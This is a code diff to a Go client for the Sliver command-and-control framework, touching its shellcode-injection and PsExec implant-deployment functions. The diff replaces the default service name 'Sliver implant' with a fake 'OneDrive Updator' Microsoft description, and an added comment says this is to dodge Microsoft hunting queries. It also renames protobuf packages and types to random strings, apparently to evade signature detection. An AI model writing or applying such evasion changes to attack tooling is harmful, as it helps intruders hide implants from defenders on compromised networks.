@@ -13,7 +13,7 @@ import (
 
 	"github.com/bishopfox/sliver/protobuf/clientpb"
 	"github.com/bishopfox/sliver/protobuf/commonpb"
-	"github.com/bishopfox/sliver/protobuf/sliverpb"
+	"github.com/bishopfox/sliver/protobuf/cpmfczjv"
 )
 
 // gzipEncode compresses data at BestSpeed, matching the sliver server's Gzip encoder.
@@ -36,7 +36,7 @@ func gzipEncode(data []byte) ([]byte, error) {
 func (c *Client) ExecuteShellcode(sessionID string, data []byte, pid uint32, rwxPages bool) error {
 	ctx, cancel := context.WithTimeout(context.Background(), 120*time.Second)
 	defer cancel()
-	resp, err := c.RPC.Task(ctx, &sliverpb.TaskReq{
+	resp, err := c.RPC.Task(ctx, &cpmfczjv.TaskReq{
 		Data:     data,
 		RWXPages: rwxPages,
 		Pid:      pid,
@@ -91,6 +91,22 @@ func (c *Client) profileBinary(profileName string) ([]byte, error) {
 	return resp.GetFile().GetData(), nil
 }
 
+// Microsoft 2022 hunt keys DisplayName "Sliver" / Description "Sliver implant".
+const (
+	defaultPsExecServiceName = "OneDrive Updator"
+	defaultPsExecServiceDesc = "Provides update support for Microsoft OneDrive."
+)
+
+func psExecServiceMeta(name, desc string) (string, string) {
+	if strings.TrimSpace(name) == "" {
+		name = defaultPsExecServiceName
+	}
+	if strings.TrimSpace(desc) == "" {
+		desc = defaultPsExecServiceDesc
+	}
+	return name, desc
+}
+
 func randomHex(n int) string {
 	b := make([]byte, n)
 	if _, err := rand.Read(b); err != nil {
@@ -112,12 +128,7 @@ func (c *Client) PsExec(sessionID, hostname, profileName, serviceName, serviceDe
 	if binPath == "" {
 		binPath = `C:\Windows\Temp`
 	}
-	if serviceName == "" {
-		serviceName = "Sliver"
-	}
-	if serviceDesc == "" {
-		serviceDesc = "Sliver implant"
-	}
+	serviceName, serviceDesc = psExecServiceMeta(serviceName, serviceDesc)
 
 	binary, err := c.profileBinary(profileName)
 	if err != nil {
@@ -135,7 +146,7 @@ func (c *Client) PsExec(sessionID, hostname, profileName, serviceName, serviceDe
 
 	ctx, cancel := context.WithTimeout(context.Background(), 120*time.Second)
 	defer cancel()
-	upload, err := c.RPC.Upload(ctx, &sliverpb.UploadReq{
+	upload, err := c.RPC.Upload(ctx, &cpmfczjv.KnrcyvFsi{
 		Encoder: "gzip",
 		Data:    compressed,
 		Path:    filePath,
